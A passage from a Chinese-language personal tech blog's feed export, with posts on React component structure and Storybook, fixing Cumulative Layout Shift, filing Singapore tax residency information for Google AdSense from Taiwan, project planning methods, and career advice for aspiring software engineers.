function_">ComponentOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">ComponentTwo</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;&gt;</span>ComponentTwo<span class="tag">&lt;/&gt;</span></span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentOne</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentTwo</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentTwo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ComponentTwo</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;&gt;</span>ComponentTwo<span class="tag">&lt;/&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ComponentOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentOne</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentTwo</span>&gt;</span><span class="tag">&lt;/<span class="name">ComponentTwo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="元件開發-Storybookjs"><a href="#元件開發-Storybookjs" class="headerlink" title="元件開發: Storybookjs"></a>元件開發: Storybookjs</h3><p>此外 Storybook 也搭著這波元件的概念，發展出了 <a href="https://www.componentdriven.org/">Component-based 的架構和開發方式</a>，這樣的概念其實就是大家熟悉的原子化設計，</p><ol><li>獨立開發每個元件，並為其不同變體撰寫故事 (測試案例)</li><li>將小型元件組合在一起以實現更複雜的功能</li><li>通過組合複合元件來組裝頁面</li><li>整合資料和業務邏輯將頁面整合到專案</li></ol><blockquote><p><img src="https://bradfrost.com/wp-content/uploads/2013/06/atomic-design.png"><br>圖片來源: <a href="https://bradfrost.com/blog/post/atomic-web-design/">https://bradfrost.com/blog/post/atomic-web-design/</a></p></blockquote><p>底下的程式碼示範了一個最簡單的故事書設定，透過以下的設定我們就能夠輕鬆的獲得一個完全隔離的環境來進行元件開發，即使多人合作的專案也不容易互相衝突，設計出來的元件也會更容易符合單一責任原則。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">Meta</span>, <span class="title class_">StoryObj</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@storybook/react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Histogram</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./Histogram&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">meta</span>: <span class="title class_">Meta</span>&lt;<span class="keyword">typeof</span> <span class="title class_">Histogram</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">component</span>: <span class="title class_">Histogram</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> meta;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Story</span> = <span class="title class_">StoryObj</span>&lt;<span class="keyword">typeof</span> <span class="title class_">Histogram</span>&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">Default</span>: <span class="title class_">Story</span> = &#123;</span><br><span class="line">  <span class="attr">args</span>: &#123;</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&quot;latency&quot;</span>,</span><br><span class="line">    <span class="attr">showHistogramLabels</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">histogramAccentColor</span>: <span class="string">&quot;#1EA7FD&quot;</span>,</span><br><span class="line">    <span class="attr">label</span>: <span class="string">&quot;Latency distribution&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由於 component-based 的概念興起元件開發成為顯學，<a href="https://linyencheng.github.io/2022/09/10/relationships-between-frontend-and-backend/css-in-js-with-reactjs/">CSS-in-JS</a> 提供了將樣式寫在元件中解決方案，也讓 CSS 需要從寫程式語言的角度去進行架構設計。</p><p>開發上 <a href="https://linyencheng.github.io/2022/09/10/relationships-between-frontend-and-backend/css-in-js-with-reactjs/">CSS-in-JS</a> 的流行，當網頁三本柱 HTML、CSS、JavaScript 能夠完整的寫在同一個檔案時，也使 Reactjs 的 UI 開發更加靈活和一致，不僅降低了維護難度也加速了開發速度減少檔案切換，同時也減少 class 命名錯誤等等問題，讓元件成為真正高內聚的元件。</p><p>常見的 library 像是 css module、vanilla-extract、styled-components、styled-jsx (Next.js)、StyleX (Facebook) 都非常好上手，更完整的將元件模組化並增加可重用性。</p>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cumulative Layout Shift (CLS)</title>
      <link href="/2024/02/02/cumulative-layout-shift/"/>
      <url>/2024/02/02/cumulative-layout-shift/</url>
      
        <content type="html"><![CDATA[<p>這篇文章主要是介紹修正 Pagespeed 未通過 Cumulative Layout Shift (CLS) 的過程，在前些時候其實 CLS 是會明顯影響曝光總數的，修正的過程中其實也很難馬上知道成果，原因是因為 Google 會藉由實際上蒐集到的情境來進行統計。</p><blockquote><p><img src="https://linyencheng.github.io/2024/02/02/cumulative-layout-shift/0201-1.PNG"></p></blockquote><h2 id="Pagespeed-出現-CLS-問題"><a href="#Pagespeed-出現-CLS-問題" class="headerlink" title="Pagespeed 出現 CLS 問題"></a>Pagespeed 出現 CLS 問題</h2><ol><li>透過 Pagespeed 的頁面進行量測，錯誤會直接顯示在網頁中，按照提示修正即可。</li></ol><p><a href="https://pagespeed.web.dev/analysis?url=https://linyencheng.github.io/2023/04/02/js-pattern/js-structure-pattern-for-code/">https://pagespeed.web.dev/analysis?url=https%3A%2F%2Flinyencheng.github.io%2F2023%2F04%2F02%2Fjs-pattern%2Fjs-structure-pattern-for-code%2F</a></p><blockquote><p><img src="https://linyencheng.github.io/2024/02/02/cumulative-layout-shift/0201-1.jpg"></p></blockquote><ol><li>透過 Google Search Console 查看統計</li></ol><p><a href="https://search.google.com/search-console/page-experience">https://search.google.com/search-console/page-experience</a></p><blockquote><p><img src="/2024/02/02/cumulative-layout-shift/0201-2.jpg"><br><img src="/2024/02/02/cumulative-layout-shift/0201-3.jpg"></p></blockquote><h2 id="Cumulative-Layout-Shift-CLS"><a href="#Cumulative-Layout-Shift-CLS" class="headerlink" title="Cumulative Layout Shift (CLS)"></a>Cumulative Layout Shift (CLS)</h2><p>累積版面位移（Cumulative Layout Shift，CLS）在很多篇文章相信都有介紹，CLS 是衡量網頁視覺穩定性的指標，用來網頁載入過程中元素位置發生變化的程度，計算方法是測量所有不穩定元素在整個載入過程中的累積變化量。</p><p>修正 Cumulative Layout Shift 通常採取以下方法:</p><ol><li>指定圖片尺寸: 避免在載入過程中因為圖片尺寸變化而導致的版面位移，這樣瀏覽器就能夠預留正確的空間，而不會導致位置變化</li><li>預留空間: 廣告通常動態載入，確認載入順序後預留固定位置，確保廣告有固定位置和顯示大小</li><li>CSS: 如果需要移動元素可以 transform 不會影響</li><li>字體載入: 字體或 Icon 的延遲載入或不正確的載入方式也可能導致</li><li>使用者操作: 如點擊、滾動等，也可能導致 CLS</li></ol><h2 id="解決-CLS-問題"><a href="#解決-CLS-問題" class="headerlink" title="解決 CLS 問題"></a>解決 CLS 問題</h2><p>以下是一些常用的工具來偵測和解決網頁中的 Cumulative Layout Shift (CLS) 問題:</p><ul><li>Google PageSpeed Insights: Google 提供的免費工具，可以分析網頁的性能並提供改進建議</li><li>Chrome 開發者工具: Performance 和 Lighthouse 等工具，可以幫助您分析網頁性能問題</li><li>Web Vitals Chrome Extention: Google 提供的外掛，可以監控網頁的核心 Web Vitals 指標</li><li>WebPageTest: 另一個免費的性能測試工具，可以幫助您評估網頁的加載速度和性能</li></ul><p>最後小編是靠著瀏覽器的 Extention 找到發生問題的 dom 元件，移除並且等待一段時間讓實際統計數字慢慢下降才得到解決。</p><blockquote><p><img src="/2024/02/02/cumulative-layout-shift/0201-4.jpg"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Frontend </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google AdSense 新加坡稅務資訊</title>
      <link href="/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/"/>
      <url>/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/</url>
      
        <content type="html"><![CDATA[<p>Google AdSense 透過 Google Asia 付款所以要台灣的 AdSense 使用者提交新加坡稅務資訊，我們需要當地國稅局提供稅務居住地證明。</p><p>小編在網路上查過申請流程後發現仍然有一些不清楚的地方，承辦人員很可能也是第一次辦，剛開始會一直請你提供對方國家制式表格範本，但其實還是有一種方式是可以自己開立的。</p><h2 id="財政部稅務入口網申請核發個人居住者證明"><a href="#財政部稅務入口網申請核發個人居住者證明" class="headerlink" title="財政部稅務入口網申請核發個人居住者證明"></a>財政部稅務入口網申請核發個人居住者證明</h2><p>這邊可以提供小編這次申請的範本給承辦人員</p><p><img src="https://linyencheng.github.io/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/IMG_20240117_231706.jpg"></p><p>底下是小編在<strong>財政部稅務入口網</strong>進行申請的步驟:</p><ol><li>前往財政部稅務入口網: <a href="https://www.etax.nat.gov.tw/etwmain/login/nhi">https://www.etax.nat.gov.tw/etwmain/login/nhi</a></li><li>使用健保卡進行登入</li><li>選單 -&gt; 線上服務 -&gt; 線上申辦 -&gt; 申辦項目搜尋框輸入 <code>居住</code><ul><li><img src="/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/0105-0.PNG"></li></ul></li><li>找到 <code>申請核發個人居住者證明</code><ul><li><img src="/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/0105-1.PNG"></li></ul></li><li>填寫相關資訊<ul><li>英文姓名、英文地址跟申請 AdSense 時必須相同</li><li>取得他方締約國來源所得: 執行業務所得，金額自行換算</li><li>身分證正反面、護照照片頁做為附件</li><li><img src="/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/0105-2.PNG"></li></ul></li><li>附件加完後，將表單點選加入送出</li><li>順利的話一周內會有專員聯絡確認並透過掛號寄出</li></ol><p>備註: 稅務局人員表示僅能申請前一年度稅務居住者證明: 2024 申請 2023 年度。</p><h2 id="Google-AdSense-提交新加坡稅務資訊"><a href="#Google-AdSense-提交新加坡稅務資訊" class="headerlink" title="Google AdSense 提交新加坡稅務資訊"></a>Google AdSense 提交新加坡稅務資訊</h2><p>Google AdSense 提交新加坡稅務資訊，拿到文件後將全英文的文件拍照成圖片檔進行上傳</p><ol><li>打開 AdSense 管理介面，找到付款 -&gt; 付款資訊 -&gt; 設定</li><li>業務類型: 獨資企業</li><li>常設機構: 否</li><li>GST: 否</li><li>專屬實體編號: 不填</li><li>免稅資格: 是</li><li>國籍: 台灣</li></ol><p>提交後 Google 審核的速度蠻快的，成功後就可以看到已獲核准的訊息</p><p><img src="/2024/01/28/google-adsense-tax-residency-certificate-for-singapore/0105-4.PNG"></p><p>備註: 每次收款手續費其實蠻貴的，如果像小編一樣收入不高的話建議可以設定暫緩付款或是起付額度</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>當時相信的專案規劃，能夠一如期待?</title>
      <link href="/2023/10/15/simplify-your-life/thinking-product-management/"/>
      <url>/2023/10/15/simplify-your-life/thinking-product-management/</url>
      
        <content type="html"><![CDATA[<p>在過去幾年的工作經驗中，有機會參加了一些不同的活動，其中包括均一的教育設計工作坊、矽谷阿雅分享的專案管理經驗談以及 Marty Cagan 分享的 Product Is Hard，這些經歷讓我能以不同的角度來看待我的職業生涯和參與的專案。</p><p>產品一次一次的迭代，職涯中一次次的轉換，人生一次一次的嘗試，在長大的過程，選擇了什麼? 放棄了什麼? 如果把生涯當成一個產品，我們當時相信的那些事情，如今是不是有成為了人生路途中的美麗風景?</p><iframe width="560" height="315" src="https://www.youtube.com/embed/YKiMrg6rgYQ?si=f4iG2li42vhCECTJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>從專案演變的角度來看，整個故事線應該會是從規畫走到執行，現在讓我們來深入了解看看整個迭代流程該是什麼樣子。</p><ul><li>規劃: 定義目標 → 定義問題 → 選擇準則 → 解決方案 → 取捨</li><li>執行: 專案時程評估 → 專案難度評估 → 專案成效評估</li></ul><h2 id="定義目標-Objective"><a href="#定義目標-Objective" class="headerlink" title="定義目標 (Objective)"></a>定義目標 (Objective)</h2><p>首先，我們需要確定我們的目標是什麼，以及如何做出決策？</p><p>我的職涯旅途中目標可能包括每天七點前回家吃晚餐、轉向純前端工程師職位、回台南休養生息、到大城市體驗生活並利用其學習資源快速成長。</p><p>對於一個網站的每個活動或專案，目標可能是增加曝光和使用者黏度或增加行銷活動營業額。在教育科技領域，目的可能是討論新型態的教學工具對學生的影響與成效，參與人員包括實際在使用線上教育平台的老師和開發者。</p><h2 id="定義問題-People-Problem"><a href="#定義問題-People-Problem" class="headerlink" title="定義問題 (People Problem)"></a>定義問題 (People Problem)</h2><p>明確了解需要解決的問題是什麼？可能需要解決的問題包括求學和工作遠離家鄉太久，需要更多家庭時間，或者不擅熬夜無法常態性加班。</p><p>在網站設計方面，我們可能需要將設計和工程師置身於使用者的角度，體驗使用者的痛點，使用工具如 Persona (人物誌) 或 User Journey Map (用戶旅程)。</p><p>以電子商務網站為例，問題可能包括網頁速度很慢、使用者不容易找到自己想要的東西或購買流程複雜。</p><h3 id="Persona-人物誌"><a href="#Persona-人物誌" class="headerlink" title="Persona 人物誌"></a>Persona 人物誌</h3><p>目的是讓人真實的感受到使用者，增加開發團隊的同理心，協助解讀行為和需求，更關注在使用者和產品互動的方式與情緒。</p><p>與其說是定義目標對象，倒不如說是過程中的一個資訊視覺化工具，協助大家在討論的過程中，盡量進入人物的感受與體驗。</p><p>我們直接從教育的角度切入，底下是當時均一歸納出來的 Persona：</p><ul><li>學習態度<ul><li>快速學習: 像是考古題、速解，想得到考試成績不用懂也可以</li><li>慢速學習: 解決問題的方法</li></ul></li><li>學習動機<ul><li>理解差異: 理解到每個人都可以有自己的學習速度，可以用不同的速度前進</li><li>找到自信: 學著從容易的部分開始一步一步前進，找到阻力最小的方式累積成就</li><li>維持專注: 乾淨的引擎才有力量，心靈也是，心思有空間也才可以放進去新東西</li><li>重要貢獻: 從接受知識的人成為分享知識的人</li><li>自主選擇: 學習成為一種選項</li></ul></li><li>學習環境<ul><li>講者互動</li><li>同儕互動</li><li>自己學習<ul><li>依照進度各自學習，藉由導入資訊系統，前後測評估，自行選擇難度</li></ul></li></ul></li></ul><h2 id="選擇準則-Selecting-Criteria"><a href="#選擇準則-Selecting-Criteria" class="headerlink" title="選擇準則 (Selecting Criteria)"></a>選擇準則 (Selecting Criteria)</h2><p>當我們確定了各種問題之後，在有限的資源和時間內，我們需要決定首先解決哪個問題。</p><ul><li>釐清個人價值觀與願景</li><li>考量薪水</li><li>考量可點的技能</li><li>考慮未來職涯發展，下下一份工作想做什麼</li></ul><p>專案上，要考慮的可能會是:</p><ul><li>專案是否符合公司的願景</li><li>用戶族群年齡</li><li>使用情境 (能夠離線使用嗎)</li><li>成本 (會需要跟其他團隊來回溝通嗎)</li></ul><h2 id="解決方案-Solution"><a href="#解決方案-Solution" class="headerlink" title="解決方案 (Solution)"></a>解決方案 (Solution)</h2><p>接下來，我們需要列出各種可能的解決方案，並以最簡單的方式驗證這些方案是否能夠解決我們定義的問題，以轉職來說</p><ul><li>精進面試和工作能力</li><li>在面試中表達不願意長時間加班的意願（我確實這樣做過）</li><li>向同學或朋友詢問有關公司內部情況的建議</li><li>使用網路論壇或線上資源進行調查</li></ul><p>針對一個活動或專案，可能的解決方案包括:</p><ul><li>響應式網頁</li><li>開發應用程式</li><li>電子報</li></ul><p>無論解決方案是什麼，我們都需要清楚地了解我們的預期結果 (Outcome)，並確保結果能符合我們當時選擇的準則 (Selecting Criteria)。</p><p>儘管過程很重要，但結果更重要，重要的是要確保結果符合我們的目標，否則就只是一堆隔靴搔癢無意義的成果 (Output)。</p><ul><li>Output 是發現了然後解決定義的 People Problem，程式上只是解 Issue 跟 Commit code</li><li>Outcome 是透過理解問題並決定我們想要得到，增加 5% 的營業額透過擺平某幾個 People Problem 來解決</li></ul><p>以未來的教育科技來說</p><ul><li>促進溝通: 通訊軟體</li><li>學習社群: Facebook 社團、讀書會</li><li>即時回饋: 資訊系統回饋</li><li>個人化學習: 按照個體學習速度前進</li><li>無邊界學習: 網路教學與練習</li><li>平台解決方案<ul><li>均一</li><li>達學堂</li><li>Quizlet</li><li>Zuvio</li></ul></li></ul><h2 id="取捨-Trade-off"><a href="#取捨-Trade-off" class="headerlink" title="取捨 (Trade-off)"></a>取捨 (Trade-off)</h2><p>為什麼會需要取捨，因為功能不是越多越好，多了必定有其他是下降的，定目標時，要有另外一個可能減少的項目來評估。像是減少優惠折扣時，但使用者同時也不能少太多。</p><blockquote><p>工作、睡眠、運動、家庭、朋友，五選三，人生會好過一點</p></blockquote><p>各種可能方法除了依照 Selecting Criteria 外也要綜合的去評估，有能力的員工只會知道最終的 Outcome，剩下的就要靠員工們自行去尋找與實作，最終這個團隊就會變成一個 Accountable 的團隊，可以由 Outcome 來進行檢視，而不是看寫了幾行程式碼。</p><p>時間有限的情況下只做基本的，只有我能做，也對目標有幫助的，最會做也不得不做的事情，最重要的是與 Mission 要一致，英文會是底下幾個單字:</p><ul><li>Value</li><li>Usability</li><li>Feasibility</li><li>Viability</li></ul><p>商業的專案可能還要考慮的因素:</p><ul><li>了解消費者</li><li>了解產品商業模式 (了解老闆)</li><li>了解消費者產生的資料</li><li>了解這個產業</li></ul><p>以教育來說，從學生行為、思考方法、來分析問題</p><ol><li>學生行為優化: 透過引導的方式，讓問題是被發現而非被指出<ul><li>垃圾無法投到垃圾袋中，請大家討論出好的方案</li><li>排隊去科任課，上課前班長集合困難，走過去學生會很吵，大家一起想出可以講話又可以準時到的方法</li></ul></li><li>思考方法優化: 協助 XXX 在 XXX 情境達成 XXX 的目的，將討論的結果，用八格漫畫去說好一個完整的故事，但如果要小學生討論主題太大的時候，怎麼找到開始的方法、蒐集資料、收斂資訊、組織與口語輸出？<ul><li>偏鄉學生: 家庭功能不足，從陪伴與較低侵入感的學習系統開始培養學習習慣與信心</li><li>城市學生: 有資源，所以可以藉由提供工具、給予機會進行組織溝通、口語表達的機會</li></ul></li></ol><p>在解決問題之前，不急著修復，首先分析可能的問題，並將問題範圍縮小到最小，接著是建立問題的漏斗，並理解背後的動機。</p><blockquote><p>數據可以告訴我們問題出現在哪裡，但無法解釋為什麼是問題</p></blockquote><p>雖然還不能明確知道未來的樣子，但還是要為自己在短期內找到一個理想的樣貌，這樣也才會知道還缺少什麼，在目前和接下來的人生中也才知道要培養什麼。</p><p>滿分的解決方案並不會出現，所以我們需要去做取捨，最重要的事情是，我們的 Objective 是什麼？</p><h2 id="專案時程評估"><a href="#專案時程評估" class="headerlink" title="專案時程評估"></a>專案時程評估</h2><p>時程評估問題，在工作初期就開始被主管要求，但那時無法合理的評估，問題是對自身及專案的掌握程度都不夠完整，也不知道有哪些方法，主管建議的就是儘可能多查資料增加掌握程度。</p><p>在讀了人月神話之後，發現除了沒有先後關係也不需要討論的任務，其他專案時程確實會有時程估計上的困難，尤其在溝通成本過高的團隊中，這樣的問題會更明顯。</p><blockquote><p><img src="https://cdn-images-1.medium.com/max/2600/1*1ytrUVfjjOh7rJDorSj8eA.png" alt="人月神話"><br>圖片來源: <a href="https://cdn-images-1.medium.com/max/2600/1*1ytrUVfjjOh7rJDorSj8eA.png">https://cdn-images-1.medium.com/max/2600/1*1ytrUVfjjOh7rJDorSj8eA.png</a></p></blockquote><h2 id="專案難度評估"><a href="#專案難度評估" class="headerlink" title="專案難度評估"></a>專案難度評估</h2><p>後來看了另外一本書 <strong>SCRUM：用一半的時間做兩倍的事</strong>，裡面建議不是去評估時間，而是用斐波那契數列去評估難度(2 3 5 8 13)，這種數列好處是可以差異化分差。</p><p>在決定難度的過程中，可以用投票的方式，其中比起舉手表決使用牌卡進行投票，會是一個比較不會受他人影響的方法，牌卡的數字結果也就代表這個問題的難度。</p><p>如果大家的分差過大或不一致怎麼辦？就再進行討論，討論為什麼簡單？為什麼困難？為什麼需要花時間？這樣估計的準度就會大為提高，也方便分派任務，且只有當每個人都發揮所長的時候，團隊的效率才有機會高於個人。</p><p>在這個方法中，感覺工時的估計可能不是重點，大家共同決定的點數才是，同類型的專案在團隊經過一段時間的磨合後，大概就可以看出團隊可以在一段時間內解掉多少的點數，時程的預估也才有參考的依據也更為真實。</p><h2 id="專案執行成效評估"><a href="#專案執行成效評估" class="headerlink" title="專案執行成效評估"></a>專案執行成效評估</h2><p>在個人的成效管理上，由於軟體工程師的工作性質關係，會是需要在專心的情況下才容易有產出，所以要儘可能去<strong>減少溝通成本</strong>。</p><p>缺乏軟體開發團隊經驗的人，很可能會以為在口頭分配並得到口頭回覆後，就只需要心裡想著<strong>發大財</strong>或時不時的走去詢(打)問(擾)成員作事，所有待解問題就會迎刃而解，專案就會自動完成<strong>發大財</strong>然後<strong>放眼台灣、征服宇宙</strong>。</p><p>網路上也就出現了下面的玩笑話：</p><blockquote><p>Go away or I will replace you with a very small shell script.</p></blockquote><p>在被沒有制度的團隊雷過以後，即使覺得打文件對自己來說並沒有什麼太大的幫助，我還是開始在團隊裡開始主動寫文件，像是開發時程、評估、重要的邏輯、參考資料等等，時間許可的情況下都盡可能把事情簡單的交代清楚。</p><p>後來發現乍看之下也許花時間，但比起來回的確認問題、回覆解答，那為什麼不練習一開始就把文件寫清楚? 這也許才是最有效率的方法。文件可以呈現的方法有很多：</p><ul><li>任務的卡片：每張卡片等於一個 User Story，List 則用狀態分類。ex 卡片處在開發中 List</li><li>Google Doc：更詳細的文件</li><li>Google Sheet：開發時程</li><li>README.md：專案怎麼跑起來</li></ul><p>處理一件事情的流程通常包括以下步驟，完成、刪去、分派、延後</p><ul><li>完成： 評估正在處理的事情是否可以立即完成，如果有時間和資源就盡早完成</li><li>刪去： 在清單上的任務但不再需要處理或不再追蹤就可以刪除</li><li>分派： 任務更適合他人處理，則可將其分派給適當的人</li><li>延後： 若需要更多時間、資源或資訊或不是優先事項，可將其延後</li></ul><p>流程管理的 PDCA 循環 <code>Plan → Do → Check → Action → Plan</code></p><ul><li>Plan (<strong>計畫</strong>): 在開會前就該把相關的資訊整理清楚，跳過只需要閱讀的部分，需要討論的才進行討論，畢竟開一個會把有產出的人關在同一個地方，成本是很高的，所以主持會議的人也要控制問題不要發散</li><li>Do (<strong>當天要做的事項</strong>): 每次討論的目的在能快速的修正及同步訊息</li><li>Check (<strong>確認</strong>): 大家的進度、方向、遇到的問題</li><li>Action (<strong>更好的方法</strong>): 能夠趁今天試看看? 怎麼找出答案? 可優化的有哪些?</li></ul><p>就好像鐵人賽三十天一樣，過程中每天不斷計畫、修正然後持續不斷的閱讀和寫作。</p><blockquote><p>三十天過後不論成果如何，最後成長的一定會包含你自己</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 專案管理 </tag>
            
            <tag> 職場老鳥必點技能 </tag>
            
            <tag> 三分鐘斷捨離 </tag>
            
            <tag> 2023ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未來的那個你，該成為工程師嗎</title>
      <link href="/2023/10/14/simplify-your-life/career-growth-mindset/"/>
      <url>/2023/10/14/simplify-your-life/career-growth-mindset/</url>
      
        <content type="html"><![CDATA[<p>後疫情時代，軟體工程師薪資也開始一路爬升，第一次轉職 50% 成長的並不在少數。</p><p>前端、後端、DevOps、SRE 等各式職缺快速增加，只依靠過往教育體制並無法培訓出適合的人才，所以企業在選才上也碰到了一個瓶頸，少子化加上職缺數量提高，薪資也不得不慢慢向上抬升。</p><p>在小編剛畢業的前幾年，破百又不加班的純軟缺不多，現在 100+ 的缺滿地都是，天花板也開始刷新，已有看到<a href="https://pttweb.tw/s/4DQdo5">上限 1000 的職缺</a>。</p><blockquote><p>當轉職成為工程師成為當代顯學的今天，我們真的該轉職成為工程師嗎?</p></blockquote><p>目前常見的轉職學習方式也非常非常多，像是資策會、社群讀書會、Code Camp、家教、補習班。</p><p>有個明顯的評估方式是這樣，若一至兩個月的課程真的有效，那為什麼要花四年養成一個資工系學生? 那兩個月其實是一個開地圖的過程，剩下還是要靠自己動機跟學習能力去補。</p><p>值得反思的是，如果連開地圖這件事都要靠上課，真的是對這個領域有興趣嗎 😅😅😅</p><iframe width="560" height="315" src="https://www.youtube.com/embed/VkP_lO2FiA0?si=l70BvNeeb-RZAVTA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><blockquote><p>也許你以為成就你的一切，都不能真正定義你<br>芭比</p></blockquote><h2 id="評估職缺的方法"><a href="#評估職缺的方法" class="headerlink" title="評估職缺的方法"></a>評估職缺的方法</h2><p>轉職前可以先想想的幾個問題：</p><ol><li>為什麼想換工作</li><li>為什麼想換產業</li><li>之前工作角色與內容</li><li>是否有空窗期，這段時間在做什麼</li></ol><p>面試前可以先想想的幾個問題：</p><ol><li>為什麼對這間公司感興趣?</li><li>了解相關產品與服務嗎?</li><li>現在薪資、預期薪資</li><li>最快可以上班的時間?</li></ol><p>比較兩間公司可以想想的幾個問題：</p><ol><li>公司規模以及人數?</li><li>工作上舒服嗎?</li><li>如何形容現在的公司，同事的個性跟公司文化是否吻合，哪種職位在公司最有價值?</li><li>上班的工時，節奏與步調?</li></ol><p>面試前，詢問面試的型態，雖然工程師的面試大部分都會請技術相關人員到場協助，但小編也是有遇到很沒 sense 只請 HR 跟搞不清楚狀況的上層主管來面試的公司，所以提早詢問面試的型態及與會人員也是一個評估跟準備的方向。</p><h2 id="STAR-履歷優化"><a href="#STAR-履歷優化" class="headerlink" title="STAR 履歷優化"></a>STAR 履歷優化</h2><p>履歷撰寫部分，語句中盡量包含 STAR (S 情境、T 任務、A 行動、R 結果)，並且要注意語句再優化，由於現在履歷都是寫在 104 或是 linkin 這樣的網路平台上，所以我們必須先通過搜尋引擎的篩選，最簡單的方式就是履歷必須有 JD 中的關鍵字，會比較有機會呈現在雇主的面前，再來就是盡量讓沒 sense 的人都可以看得懂。</p><blockquote><p>在什麼情境下，透過怎麼樣的行動去完成任務，最後的結果如何?</p></blockquote><p>例如: 串接 API 。這樣的敘述也是會被說描述不清楚 (當然個人判斷這種主管就有點危險?)。</p><p>如果也需要讓這樣的人都可以看懂，可以寫成串接會員系統 API 並加上量化的資訊，譬如會員系統 API 每天平均使用人次，這樣可以幫沒 sense 的人更快速的了解與評估我們的技術能力。</p><h3 id="盤點自己"><a href="#盤點自己" class="headerlink" title="盤點自己"></a>盤點自己</h3><p>軟體開發前的思考完整度可能決定很大一部分的結果，所以清楚完整的表達想法也是工程師該有的訓練。</p><ul><li>清楚：代表著簡單易懂的打到問題痛點</li><li>完整：除了解決基本問題外還額外考慮例外的狀況</li></ul><p>被問問題時可以聽出問題背後真正想了解的，目的是釐清問題和可用資源，畢竟連問問題的人可能都屬於不擅表達的部分，若是沒有進一步確認相關需求，很可能回答打不到痛點。</p><ol><li>自我介紹的部分，透過強調履歷相關的部分，說出為什麼適合這個職位</li><li>離開前一間公司的原因? 要看看是不是有沒有辦法克服的部分</li></ol><p>在決定前可以問自己關於工作方面成就感的問題：</p><ol><li>感覺到成就感的事情?</li><li>參與的腳色?</li><li>這樣的成就是怎麼達到的，使用的特質與態度?</li></ol><p>可以使用神奇的斐波那契數列打分數 1 2 3 5 